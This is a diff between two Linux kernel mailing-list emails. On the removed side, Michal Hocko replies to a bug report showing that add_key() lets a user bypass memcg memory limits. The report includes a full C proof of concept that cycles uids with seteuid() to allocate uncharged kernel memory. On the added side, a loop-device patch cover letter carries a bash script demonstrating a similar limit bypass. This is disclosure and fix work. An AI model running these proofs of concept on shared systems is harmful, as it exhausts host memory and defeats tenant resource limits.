@@ -2,144 +2,218 @@ Return-Path: <cgroups-owner@vger.kernel.org>
 X-Original-To: lists+cgroups@lfdr.de
 Delivered-To: lists+cgroups@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id 12B9434C519
-	for <lists+cgroups@lfdr.de>; Mon, 29 Mar 2021 09:40:41 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 2913434D2BB
+	for <lists+cgroups@lfdr.de>; Mon, 29 Mar 2021 16:49:52 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S231312AbhC2HkI (ORCPT <rfc822;lists+cgroups@lfdr.de>);
-        Mon, 29 Mar 2021 03:40:08 -0400
-Received: from mx2.suse.de ([195.135.220.15]:37210 "EHLO mx2.suse.de"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S231354AbhC2Hjp (ORCPT <rfc822;cgroups@vger.kernel.org>);
-        Mon, 29 Mar 2021 03:39:45 -0400
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.com; s=susede1;
-        t=1617003584; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
-         mime-version:mime-version:content-type:content-type:
-         content-transfer-encoding:content-transfer-encoding:
-         in-reply-to:in-reply-to:references:references;
-        bh=Awe1edIW7HAOiUt+RBmLfJWuVVokUbchDFh5Qge6oI8=;
-        b=NUKM6iFAgfWtvIpxM1eVye/CaKKOmtbFhRt+GxNMj3mSSxxJ6JwxzDx+HN7S3qY0VIp5M7
-        cfYqWae/+dJlrfwmYmTkc5g6O9SH0aExLdx7dkvk7SJBnIzJJ54i9px7+cOiRUsNF7sjGO
-        CWpItdr5zzVGHzFTyeb6mZok62wNRWM=
-Received: from relay2.suse.de (unknown [195.135.221.27])
-        by mx2.suse.de (Postfix) with ESMTP id E8D55AE89;
-        Mon, 29 Mar 2021 07:39:43 +0000 (UTC)
-Date:   Mon, 29 Mar 2021 09:39:42 +0200
-From:   Michal Hocko <mhocko@suse.com>
-To:     =?utf-8?B?5p2o5pix5aSp?= <ytyang@zju.edu.cn>
-Cc:     hannes@cmpxchg.org, vdavydov.dev@gmail.com,
-        cgroups@vger.kernel.org, linux-mm@kvack.org,
-        shenwenbosmile@gmail.com, David Howells <dhowells@redhat.com>,
-        Jarkko Sakkinen <jarkko@kernel.org>,
-        James Morris <jmorris@namei.org>,
-        "Serge E. Hallyn" <serge@hallyn.com>, keyrings@vger.kernel.org,
-        linux-security-module@vger.kernel.org
-Subject: Re: add_key() syscall can lead to bypassing memcg limits
-Message-ID: <YGGEPrYCDmSCjuun@dhcp22.suse.cz>
-References: <7d222142.1e89e.17876ab335a.Coremail.ytyang@zju.edu.cn>
+        id S231320AbhC2OtU (ORCPT <rfc822;lists+cgroups@lfdr.de>);
+        Mon, 29 Mar 2021 10:49:20 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:49614 "EHLO
+        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S231311AbhC2Osz (ORCPT
+        <rfc822;cgroups@vger.kernel.org>); Mon, 29 Mar 2021 10:48:55 -0400
+Received: from mail-qt1-x836.google.com (mail-qt1-x836.google.com [IPv6:2607:f8b0:4864:20::836])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 6B085C061574;
+        Mon, 29 Mar 2021 07:48:55 -0700 (PDT)
+Received: by mail-qt1-x836.google.com with SMTP id 1so8820731qtb.0;
+        Mon, 29 Mar 2021 07:48:55 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=from:to:cc:subject:date:message-id:mime-version
+         :content-transfer-encoding;
+        bh=+SrhRYacxLlj/HDLWdt9e70QVg4KZ/37qGsIxhEHOfQ=;
+        b=bnloEp7HixUEx2GuoGaWnZPs0X9sobCEVYM4s55n8xs4VmBDp22IYYkoENeEFjLtoe
+         afVNeOtlv8I3d91sVOWjFY+8RIfZ9PWxoFiLwMeLWdfcK3XAiq4AlTn+wx86Pgc/c0j9
+         gPzpuyqrOYTUw8n/MeEwdu//hnwJHzz4ocoIg7Bw1kF3CkOCMOU2BRENZTmuWJ2hAhkn
+         9WpAwe2jBIIbXX5EVz/Jm26JifmlRwzsxmJnlpBOBRKkMC9qgnmaCseCcUaVYiiKK7Hv
+         UnnyBtjWHJJtsyHJ7LNZbIgSMhEHvww4GIRBKJIYlrXFV3lK0AczOsSiD6fR77uwfJ5I
+         F+WA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:from:to:cc:subject:date:message-id:mime-version
+         :content-transfer-encoding;
+        bh=+SrhRYacxLlj/HDLWdt9e70QVg4KZ/37qGsIxhEHOfQ=;
+        b=djzVc47YyomxCz24egrc6OWUNlaKUgisaFzFQlIzzY+S43md21wVc1/E8Fcnddab6W
+         yj+kUOCLyvGjdWonx9R54xO0zdRMxsmT6IcsPGSZj2IHjz5nzuu8drWoWPSyS0Gh7z/+
+         7cK59umbi9YMBDVE2vYmD0wR5j7USKEDzLxWXLx+SYelDudAIOLlcl1y0J6cpNpJ2u9b
+         SQXhigrokqu1vK1mVMGRjX9sO3cMxJ4a8bSN74L2P9XxbKaVTeZXL2MmsroaT9hDrdFs
+         Q2fyRqUkU5hvLYQ2c7Q+x1Ish0AV+uvhzKSaibyRdmAK4EuQOStWZNb0Ff7hPA/Bk4CA
+         MwuQ==
+X-Gm-Message-State: AOAM533miUV9mY64HaxgRj3+SdR40miORMHqpCmji4ULI8LQ8l4FV9TW
+        e0DqqyF3n91fgefZu2xVscc=
+X-Google-Smtp-Source: ABdhPJwbrme1KH7Nk2u72pH+gk3PhRmgaJmwTfVNx6y49YRCRk3O0LqCiHcT/4+IUaa8utO1fVZcvQ==
+X-Received: by 2002:ac8:7b4b:: with SMTP id m11mr23567641qtu.276.1617029334613;
+        Mon, 29 Mar 2021 07:48:54 -0700 (PDT)
+Received: from localhost ([2620:10d:c091:480::1:6ffc])
+        by smtp.gmail.com with ESMTPSA id q24sm13156066qki.120.2021.03.29.07.48.53
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 29 Mar 2021 07:48:54 -0700 (PDT)
+From:   Dan Schatzberg <schatzberg.dan@gmail.com>
+Cc:     Jens Axboe <axboe@kernel.dk>, Tejun Heo <tj@kernel.org>,
+        Zefan Li <lizefan.x@bytedance.com>,
+        Johannes Weiner <hannes@cmpxchg.org>,
+        Andrew Morton <akpm@linux-foundation.org>,
+        Michal Hocko <mhocko@kernel.org>,
+        Vladimir Davydov <vdavydov.dev@gmail.com>,
+        Hugh Dickins <hughd@google.com>,
+        Shakeel Butt <shakeelb@google.com>,
+        Roman Gushchin <guro@fb.com>, Yang Shi <shy828301@gmail.com>,
+        Muchun Song <songmuchun@bytedance.com>,
+        Alex Shi <alex.shi@linux.alibaba.com>,
+        Alexander Duyck <alexander.h.duyck@linux.intel.com>,
+        Yafang Shao <laoar.shao@gmail.com>,
+        Wei Yang <richard.weiyang@gmail.com>,
+        linux-block@vger.kernel.org (open list:BLOCK LAYER),
+        linux-kernel@vger.kernel.org (open list),
+        cgroups@vger.kernel.org (open list:CONTROL GROUP (CGROUP)),
+        linux-mm@kvack.org (open list:MEMORY MANAGEMENT)
+Subject: [PATCH V11 0/3] Charge loop device i/o to issuing cgroup
+Date:   Mon, 29 Mar 2021 07:48:22 -0700
+Message-Id: <20210329144829.1834347-1-schatzberg.dan@gmail.com>
+X-Mailer: git-send-email 2.30.2
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
 Content-Transfer-Encoding: 8bit
-In-Reply-To: <7d222142.1e89e.17876ab335a.Coremail.ytyang@zju.edu.cn>
+To:     unlisted-recipients:; (no To-header on input)
 Precedence: bulk
 List-ID: <cgroups.vger.kernel.org>
 X-Mailing-List: cgroups@vger.kernel.org
 
-Cc keyctl maintainers
+No major changes, rebased on top of latest mm tree
 
-On Sun 28-03-21 10:30:34, 杨昱天 wrote:
-> Hi, our team has found a bug in key_alloc() on Linux kernel v5.10.19, which leads to bypassing memcg limits.
-> The bug is caused by the code snippets listed below:
-> 
-> /*--------------- key.c --------------------*/
-> ...
-> 276/* allocate and initialise the key and its description */
-> 277key = kmem_cache_zalloc(key_jar, GFP_KERNEL);
-> 278if (!key)
-> 279goto no_memory_2;
-> ...
-> /*---------------- end ---------------------*/
-> 
-> /*------------- keyctl.c -------------------*/
-> ...
-> 95  if (_description) {
-> 96description = strndup_user(_description, KEY_MAX_DESC_SIZE);
-> 97if (IS_ERR(description)) {
-> ...
-> /*--------------- end ---------------------*/
-> 
-> Each user can allocate ~20KB uncharged memory by calling add_key syscall to trigger the listed code.
-> Code at line 277 in the first snippet allocates a new struct key object that is not charged by memcg, as no accouting flag is passed to neither the
-> allocation site here nor the key_jar's creating site. At line 96 in the second snippet, we found that memory used by description of a key, 
-> which has a maximum size of 4096 bytes, is also not charged. A user can allocate multiple keys and consume more uncharged memory. 
-> The upper limit of key memory's size is set to 20,000 bytes by default for each user.
-> 
-> The bug can cause severe memcg limit bypassing if a process can change its uid and bypass the above limit. For example, a user may own root privilege 
-> in its user namespace and leverage seteuid() syscall to continuously change its uid. 
-> Our evaluation on QEMU v5.1.0 + cgroup v2 shows that, under this assumption, we could consume ~2.2G memory by allocating keys from 100,000 different uids, while the memory charged by memcg is ~215MB.
+Changes since V11:
 
-Can the user/attacker create all those different uids? Or what would be
-a typical scenario where this a threat? In other words is this a
-practical attack vector?
+* Removed WQ_MEM_RECLAIM flag from loop workqueue. Technically, this
+  can be driven by writeback, but this was causing a warning in xfs
+  and likely other filesystems aren't equipped to be driven by reclaim
+  at the VFS layer.
+* Included a small fix from Colin Ian King.
+* reworked get_mem_cgroup_from_mm to institute the necessary charge
+  priority.
 
-If yes then the mitigation woulld be quite easy for the key_jar (just
-add __GFP_ACCOUNT). I am not aware we would have strndup_user
-alternative with kemecg enabled so this would have to be added.
+Changes since V10:
 
-> 
-> The PoC code is listed below:
-> 
-> /*--------------- PoC --------------------*/
-> #include <asm/unistd.h>
-> #include <linux/keyctl.h>
-> #include <unistd.h>
-> #include <stdio.h>
-> #include <string.h>
-> #include <stdlib.h>
-> #include <time.h>
-> 
-> char desc[4000];
-> void alloc_key_user(int id) {
->   int i = 0, times = -1;
->   __s32 serial = 0;
->   int res_uid = seteuid(id);
->   if (res_uid == 0)
->     printf("uid allocation success on id %d!\n", id);
->   else {
->     printf("uid allocation failed on id %d!\n", id);
->     return;
->   }
->   srand(time(0));
->   while (serial != 0xffffffff) {
->     ++times;
->     for (i = 0; i < 3900; ++i)
->       desc[i] = rand()%255 + 1;
->     desc[i] = '\0';
->     serial = syscall(__NR_add_key, "user", desc, "payload",
->       strlen("payload"), KEY_SPEC_SESSION_KEYRING);
->   }
->   printf("allocation happened %d times.\n", times);
->   seteuid(0);
-> }
-> 
-> int main() {
->   int loop_times = 0;
->   int start_uid = 0;
->   scanf("%d %d", &start_uid, &loop_times);
->   for (int i = 0; i < loop_times; ++i) {
->     alloc_key_user(i+start_uid);
->   }
->   return 0;
-> }
-> 
-> /*-------------PoC end ---------------------*/
-> 
-> Thanks!
-> 
-> Best regards,
-> Yutian Yang
+* Added page-cache charging to mm: Charge active memcg when no mm is set
+
+Changes since V9:
+
+* Rebased against linus's branch which now includes Roman Gushchin's
+  patch this series is based off of
+
+Changes since V8:
+
+* Rebased on top of Roman Gushchin's patch
+  (https://lkml.org/lkml/2020/8/21/1464) which provides the nesting
+  support for setting active memcg. Dropped the patch from this series
+  that did the same thing.
+
+Changes since V7:
+
+* Rebased against linus's branch
+
+Changes since V6:
+
+* Added separate spinlock for worker synchronization
+* Minor style changes
+
+Changes since V5:
+
+* Fixed a missing css_put when failing to allocate a worker
+* Minor style changes
+
+Changes since V4:
+
+Only patches 1 and 2 have changed.
+
+* Fixed irq lock ordering bug
+* Simplified loop detach
+* Added support for nesting memalloc_use_memcg
+
+Changes since V3:
+
+* Fix race on loop device destruction and deferred worker cleanup
+* Ensure charge on shmem_swapin_page works just like getpage
+* Minor style changes
+
+Changes since V2:
+
+* Deferred destruction of workqueue items so in the common case there
+  is no allocation needed
+
+Changes since V1:
+
+* Split out and reordered patches so cgroup charging changes are
+  separate from kworker -> workqueue change
+
+* Add mem_css to struct loop_cmd to simplify logic
+
+The loop device runs all i/o to the backing file on a separate kworker
+thread which results in all i/o being charged to the root cgroup. This
+allows a loop device to be used to trivially bypass resource limits
+and other policy. This patch series fixes this gap in accounting.
+
+A simple script to demonstrate this behavior on cgroupv2 machine:
+
+'''
+#!/bin/bash
+set -e
+
+CGROUP=/sys/fs/cgroup/test.slice
+LOOP_DEV=/dev/loop0
+
+if [[ ! -d $CGROUP ]]
+then
+    sudo mkdir $CGROUP
+fi
+
+grep oom_kill $CGROUP/memory.events
+
+# Set a memory limit, write more than that limit to tmpfs -> OOM kill
+sudo unshare -m bash -c "
+echo \$\$ > $CGROUP/cgroup.procs;
+echo 0 > $CGROUP/memory.swap.max;
+echo 64M > $CGROUP/memory.max;
+mount -t tmpfs -o size=512m tmpfs /tmp;
+dd if=/dev/zero of=/tmp/file bs=1M count=256" || true
+
+grep oom_kill $CGROUP/memory.events
+
+# Set a memory limit, write more than that limit through loopback
+# device -> no OOM kill
+sudo unshare -m bash -c "
+echo \$\$ > $CGROUP/cgroup.procs;
+echo 0 > $CGROUP/memory.swap.max;
+echo 64M > $CGROUP/memory.max;
+mount -t tmpfs -o size=512m tmpfs /tmp;
+truncate -s 512m /tmp/backing_file
+losetup $LOOP_DEV /tmp/backing_file
+dd if=/dev/zero of=$LOOP_DEV bs=1M count=256;
+losetup -D $LOOP_DEV" || true
+
+grep oom_kill $CGROUP/memory.events
+'''
+
+Naively charging cgroups could result in priority inversions through
+the single kworker thread in the case where multiple cgroups are
+reading/writing to the same loop device. This patch series does some
+minor modification to the loop driver so that each cgroup can make
+forward progress independently to avoid this inversion.
+
+With this patch series applied, the above script triggers OOM kills
+when writing through the loop device as expected.
+
+Dan Schatzberg (3):
+  loop: Use worker per cgroup instead of kworker
+  mm: Charge active memcg when no mm is set
+  loop: Charge i/o to mem and blk cg
+
+ drivers/block/loop.c       | 248 ++++++++++++++++++++++++++++++-------
+ drivers/block/loop.h       |  15 ++-
+ include/linux/memcontrol.h |   6 +
+ kernel/cgroup/cgroup.c     |   1 +
+ mm/filemap.c               |   2 +-
+ mm/memcontrol.c            |  73 ++++++-----
+ mm/shmem.c                 |   4 +-
+ 7 files changed, 267 insertions(+), 82 deletions(-)
 
 -- 
-Michal Hocko
-SUSE Labs
+2.30.2
+
